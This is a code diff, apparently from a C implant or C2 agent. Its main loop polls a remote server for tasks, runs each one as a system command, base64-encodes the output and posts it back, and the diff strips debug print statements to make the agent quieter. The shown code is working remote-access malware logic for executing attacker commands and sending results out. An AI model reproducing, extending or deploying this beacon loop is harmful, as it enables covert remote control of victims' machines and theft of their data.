@@ -964,28 +964,22 @@ void myMain()
 
     while (TRUE)
     {
-        ((PRINTF)api->printf)("\nzxcv");
         jsonResponse = GetRequest(api, wServer, port, fullPath);
 
         if (jsonResponse == NULL)
         {
-            ((PRINTF)api->printf)("Nothing");
-
             ((SLEEP)api->Sleep)(3000);
             continue;
         }
 
         task = readJsonTask(api, jsonResponse, &taskId, &agentUuid);
-        ((PRINTF)api->printf)("%s", task);
         taskOutput = myTrimB(api, ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput), '\n');
 
-        ((PRINTF)api->printf)("%s", taskOutput);
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
         b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);
 
         totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(taskId) + myStrlenA(agentUuid);
-        ((PRINTF)api->printf)("\ntotalJsonSize: %d\n", totalJsonSize);
         json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
         ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
         WCHAR fullPath2[] =
@@ -1011,13 +1005,10 @@ void myMain()
         }
 
         ((SLEEP)api->Sleep)(3000);
-        ((PRINTF)api->printf)("asdf");
     }
     if (fullPath)
     {
-        ((PRINTF)api->printf)("free fullpath");
         ((FREE)api->free)(fullPath);
     }
-
 }
 
